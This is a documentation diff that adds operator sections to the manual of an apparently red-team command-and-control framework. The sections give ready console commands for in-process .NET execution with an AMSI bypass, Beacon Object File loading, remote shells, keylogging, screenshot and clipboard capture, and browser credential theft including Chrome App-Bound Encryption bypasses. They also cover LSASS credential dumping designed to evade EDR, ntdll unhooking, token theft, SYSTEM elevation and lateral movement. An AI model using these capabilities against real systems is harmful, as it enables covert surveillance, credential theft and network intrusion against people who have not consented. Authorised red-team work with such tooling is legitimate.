@@ -791,7 +791,354 @@ orchestra-console send --agent DESKTOP-WIN10 --command Shutdown
 
 ---
 
-## 14. Emergency Procedures
+---
+
+## 14. .NET Assembly Execution
+
+### ExecuteAssembly — In-Process .NET Execution
+
+Execute any .NET Framework 4.x assembly in-process via CLR hosting:
+
+```bash
+# Execute a .NET assembly with arguments
+orchestra-console send --agent DESKTOP-WIN10 --command ExecuteAssembly \
+  --args '{"data":"<base64-encoded-assembly>","args":"arg1 arg2","timeout":60}'
+```
+
+**How it works:**
+1. The agent lazily initializes the CLR (via `mscoree.dll` → `CLRCreateInstance`) on first use
+2. A fresh `AppDomain` is created for each execution (isolated, auto-unloaded)
+3. AMSI bypass is applied before loading the assembly
+4. The assembly's entry point is called via `ExecuteInDefaultAppDomain`
+5. Output (stdout/stderr) is captured and returned
+6. CLR resources are auto-teardown after 5 minutes idle
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| `data` | bytes | required | Raw .NET assembly bytes |
+| `args` | string | `""` | Space-delimited arguments |
+| `timeout_secs` | u32 | 60 | Execution timeout in seconds |
+
+**Operational notes:**
+- Assembly must target .NET Framework 4.x (not .NET Core/.NET 5+)
+- Max output: 4 MiB per execution
+- Each execution gets its own `AppDomain` — no state leakage between runs
+- CLR stays loaded between executions (lazy init, once per process)
+
+---
+
+## 15. BOF / COFF Execution
+
+### ExecuteBOF — Beacon Object File Execution
+
+Execute standard BOF files compatible with the public Cobalt Strike BOF ecosystem:
+
+```bash
+# Execute a BOF with packed arguments
+orchestra-console send --agent DESKTOP-WIN10 --command ExecuteBOF \
+  --args '{"data":"<base64-encoded-coff>","args":"<packed-args>","timeout":30}'
+```
+
+**How it works:**
+1. Parse COFF object file headers, sections, symbols, and relocations
+2. Allocate RW memory, copy sections
+3. Resolve Beacon-compatible API exports (BeaconPrintf, BeaconDataParse, etc.)
+4. Apply x86_64 COFF relocations
+5. `mprotect` to RX, call `void go(char *args, int len)`
+6. Collect output from Beacon-compatible output functions
+
+**Beacon-compatible API exports:**
+
+| Export | Purpose |
+|--------|---------|
+| `BeaconPrintf` | Formatted output |
+| `BeaconOutput` | Raw output |
+| `BeaconDataParse` | Parse packed arguments |
+| `BeaconDataInt` / `BeaconDataShort` | Extract numeric args |
+| `BeaconDataLength` / `BeaconDataExtract` | Extract buffer args |
+| `BeaconFormatAlloc` / `BeaconFormatPrintf` | Format buffer |
+| `BeaconUseToken` / `BeaconRevertToken` | Token ops (no-op) |
+| `BeaconIsAdmin` | Elevation check |
+| `toNative` | char* to wide string |
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| `data` | bytes | required | COFF object file bytes |
+| `args` | bytes | `""` | Packed BOF arguments |
+| `timeout_secs` | u32 | 30 | Execution timeout |
+
+**Constraints:**
+- Max BOF size: 1 MiB
+- Max output: 1 MiB
+- Architecture: x86_64 only
+- Execution is synchronous (blocks until `go()` returns)
+
+---
+
+## 16. Interactive Shell Management
+
+### Creating and Using Shells
+
+Full interactive PTY sessions with background reader threads:
+
+```bash
+# Create a new shell session
+orchestra-console send --agent DESKTOP-WIN10 --command CreateShell \
+  --args '{"shell_type":"cmd"}'
+# Returns: {"session_id":"shell-abc123","pid":4521}
+
+# Send input to the shell
+orchestra-console send --agent DESKTOP-WIN10 --command ShellInput \
+  --args '{"session_id":"shell-abc123","data":"whoami\n"}'
+
+# List all active shell sessions
+orchestra-console send --agent DESKTOP-WIN10 --command ShellList
+
+# Resize a shell's PTY
+orchestra-console send --agent DESKTOP-WIN10 --command ShellResize \
+  --args '{"session_id":"shell-abc123","rows":50,"cols":120}'
+
+# Close a shell session
+orchestra-console send --agent DESKTOP-WIN10 --command ShellClose \
+  --args '{"session_id":"shell-abc123"}'
+```
+
+**Shell output** is delivered asynchronously via `ShellOutput` messages:
+- Output arrives as `Message::ShellOutput` events
+- Each message includes `session_id`, `stream` (Stdout/Stderr), and `data`
+- Reader threads are **paused during sleep obfuscation** to prevent corruption
+
+**Supported shells:**
+
+| Platform | Default | Custom |
+|----------|---------|--------|
+| Windows | `cmd.exe` | Any executable path |
+| Linux | `/bin/sh` | `/bin/zsh`, `/bin/bash`, custom |
+| macOS | `/bin/sh` | `/bin/zsh`, `/bin/bash`, custom |
+
+**OPSEC notes:**
+- Multiple concurrent sessions supported
+- Shell reader threads are automatically paused/resumed during sleep obfuscation cycles
+- Shell handles are cleaned up when the agent disconnects
+
+---
+
+## 17. Surveillance Operations
+
+### Screenshot Capture
+
+```bash
+# Capture all monitors
+orchestra-console send --agent DESKTOP-WIN10 --command Screenshot
+# Returns: {"images":[{"monitor":0,"width":1920,"height":1080,"data":"<base64-png>"}]}
+```
+
+Requires `surveillance` feature flag.
+
+### Keylogger
+
+```bash
+# Start keylogger
+orchestra-console send --agent DESKTOP-WIN10 --command KeyloggerStart
+
+# Dump captured keystrokes (clears buffer)
+orchestra-console send --agent DESKTOP-WIN10 --command KeyloggerDump
+# Returns: {"keystrokes":[{"timestamp":...,"key":"A","modifiers":["Shift"]}, ...]}
+
+# Stop keylogger
+orchestra-console send --agent DESKTOP-WIN10 --command KeyloggerStop
+```
+
+**Implementation:** `WH_KEYBOARD_LL` hook via `SetWindowsHookExW`. All data stored in ChaCha20-Poly1305 encrypted ring buffers.
+
+### Clipboard Monitoring
+
+```bash
+# Start clipboard monitor
+orchestra-console send --agent DESKTOP-WIN10 --command ClipboardMonitorStart
+
+# Dump captured clipboard data
+orchestra-console send --agent DESKTOP-WIN10 --command ClipboardMonitorDump
+
+# Stop clipboard monitor
+orchestra-console send --agent DESKTOP-WIN10 --command ClipboardMonitorStop
+
+# One-shot clipboard read
+orchestra-console send --agent DESKTOP-WIN10 --command ClipboardGet
+```
+
+**All surveillance commands require the `surveillance` feature flag.**
+
+---
+
+## 18. Browser Data Extraction
+
+### Collecting Browser Credentials and Cookies
+
+```bash
+# Collect Chrome credentials
+orchestra-console send --agent DESKTOP-WIN10 --command BrowserData \
+  --args '{"browser":"chrome","data_type":"credentials"}'
+
+# Collect Firefox cookies
+orchestra-console send --agent DESKTOP-WIN10 --command BrowserData \
+  --args '{"browser":"firefox","data_type":"cookies"}'
+
+# Collect all data from all browsers
+orchestra-console send --agent DESKTOP-WIN10 --command BrowserData \
+  --args '{"browser":"all","data_type":"all"}'
+```
+
+**Browser types:** `chrome`, `edge`, `firefox`, `all`
+**Data types:** `credentials`, `cookies`, `all`
+
+**Chrome App-Bound Encryption (v127+):**
+
+Chrome 127+ uses App-Bound Encryption tied to `elevation_service.exe`. The agent uses three bypass strategies in order:
+
+1. **Local COM** — Activate `IElevator` COM object in-process (requires elevated agent)
+2. **SYSTEM token + DPAPI** — Impersonate SYSTEM, call `CryptUnprotectData` (requires `SeDebugPrivilege`)
+3. **Named-pipe IPC** — Communicate with `elevation_service.exe` via named pipe (requires service running)
+
+**Requires the `browser-data` feature flag. Available on Windows only.**
+
+---
+
+## 19. LSASS Credential Harvesting
+
+### HarvestLSASS — In-Memory Credential Extraction
+
+```bash
+# Harvest credentials from LSASS
+orchestra-console send --agent DESKTOP-WIN10 --command HarvestLSASS
+# Returns: JSON with MSV (NT hashes), WDigest (plaintext), Kerberos, DPAPI, DCC2
+```
+
+**How it works:**
+1. Open LSASS process handle via `NtOpenProcess` (indirect syscall)
+2. Enumerate memory regions via `NtQueryVirtualMemory`
+3. Read credential structures incrementally via `NtReadVirtualMemory`
+4. Parse in-process — no disk writes, no `MiniDumpWriteDump`
+
+**Extracted credential types:**
+
+| Type | Contents | Value |
+|------|----------|-------|
+| **MSV1.0** | NT hashes | `LM:NT` hash pairs |
+| **WDigest** | Plaintext passwords | Only if WDigest enabled (pre-Win8) |
+| **Kerberos** | TGT/TGS tickets | Ticket hashes |
+| **DPAPI** | Master keys | Key material |
+| **DCC2** | Domain cached credentials | Domain hash cache |
+
+**Supported Windows builds:** 19041–26100 (Windows 10 2004 through Windows 11 24H2)
+
+**OPSEC properties:**
+- No file I/O — all reading via syscalls
+- No `MiniDumpWriteDump` — avoids the most common LSASS access indicator
+- Indirect syscalls for LSASS handle acquisition
+- Incremental reads — only credential-bearing memory regions
+
+> **⚠️ Warning**: LSASS access is heavily monitored by EDR products. Use only when
+> the operational benefit outweighs the detection risk.
+
+---
+
+## 20. NTDLL Unhooking
+
+### On-Demand Ntdll Unhook
+
+```bash
+# Force a full ntdll re-fetch
+orchestra-console send --agent DESKTOP-WIN10 --command UnhookNtdll
+# Returns: UnhookResult { method, bytes_overwritten, hooks_detected, stubs_re_resolved, error }
+```
+
+**When to use:**
+- After EDR detection events (possible hooking)
+- After agent migration to a new process
+- Periodically during long engagements
+- After sleep obfuscation wake (automatic, but can be triggered manually)
+
+**Unhooking pipeline:**
+1. Hook detection: Inspect first bytes of 23 critical syscall stubs for hook indicators (`E9 jmp`, `FF 25 jmp`, `ud2`, `ret`)
+2. Primary path: Re-fetch `.text` from `\KnownDlls\ntdll.dll` (kernel-maintained clean copy)
+3. Fallback: Read `C:\Windows\System32\ntdll.dll` from disk (if KnownDlls blocked)
+4. Chunked overwrite: 4 KiB chunks with 50 µs anti-EDR delays
+5. Cache invalidation: Re-resolve all 23 critical SSNs from clean ntdll
+
+**Automatic triggers:**
+- **Halo's Gate failure**: When all adjacent syscall stubs are hooked
+- **Post-sleep wake**: Step 12 of sleep obfuscation checks for new hooks
+- **Manual**: `UnhookNtdll` command from operator
+
+---
+
+## 21. Token Manipulation
+
+### Token Operations
+
+```bash
+# Create a new logon session with credentials
+orchestra-console send --agent DESKTOP-WIN10 --command MakeToken \
+  --args '{"username":"admin","password":"pass123","domain":"CORP"}'
+
+# Steal a token from a running process
+orchestra-console send --agent DESKTOP-WIN10 --command StealToken \
+  --args '{"pid":1234}'
+
+# Revert to original security context
+orchestra-console send --agent DESKTOP-WIN10 --command Rev2Self
+
+# Elevate to SYSTEM via named pipe impersonation
+orchestra-console send --agent DESKTOP-WIN10 --command GetSystem
+```
+
+**Token lifecycle:**
+1. `MakeToken` / `StealToken` — Acquire new security context
+2. All subsequent commands run under the new context
+3. `Rev2Self` — Revert to original context
+4. `GetSystem` — Elevate to SYSTEM (named pipe impersonation technique)
+
+**Thread safety:** Token operations are thread-safe. Multiple commands can use the impersonated token simultaneously.
+
+---
+
+## 22. Lateral Movement
+
+### Lateral Movement Commands
+
+```bash
+# PsExec-style execution
+orchestra-console send --agent DESKTOP-WIN10 --command PsExec \
+  --args '{"target":"192.168.1.50","service_name":"update","command":"whoami"}'
+
+# WMI remote execution
+orchestra-console send --agent DESKTOP-WIN10 --command WmiExec \
+  --args '{"target":"192.168.1.50","command":"whoami"}'
+
+# DCOM execution
+orchestra-console send --agent DESKTOP-WIN10 --command DcomExec \
+  --args '{"target":"192.168.1.50","clsid":"{4991D34B-80A1-4291-83B6-A33FC0612B25}","command":"cmd.exe /c whoami"}'
+
+# WinRM execution
+orchestra-console send --agent DESKTOP-WIN10 --command WinRmExec \
+  --args '{"target":"192.168.1.50","command":"whoami"}'
+```
+
+**Technique comparison:**
+
+| Technique | Protocol | Stealth | Prerequisites |
+|-----------|----------|---------|--------------|
+| **PsExec** | SMB + Service Control Manager | Low (creates service) | Admin credentials |
+| **WMI** | DCOM/WMI | Medium (no service creation) | Admin credentials, WMI enabled |
+| **DCOM** | DCOM | Medium (varies by CLSID) | Admin credentials, DCOM enabled |
+| **WinRM** | HTTP/WSMAN | Medium | Admin credentials, WinRM enabled |
+
+**All lateral movement commands require the agent to run on Windows. No PowerShell is used.**
+
+---
+
+## 23. Emergency Procedures
 
 ### Agent Self-Destruct
 
@@ -836,4 +1183,7 @@ orchestra-server export-audit --output /secure/location/audit-$(date +%Y%m%d-%H%
 - [REDIRECTOR_GUIDE.md](REDIRECTOR_GUIDE.md) — Redirector deployment
 - [ARCHITECTURE.md](ARCHITECTURE.md) — Internal architecture
 - [SECURITY.md](SECURITY.md) — Security considerations
+- [FEATURES.md](FEATURES.md) — Feature flag reference
 - [QUICKSTART.md](QUICKSTART.md) — Getting started guide
+- [P2P_MESH.md](P2P_MESH.md) — P2P mesh protocol and topology
+- [USER_GUIDE.md](USER_GUIDE.md) — End-user guide
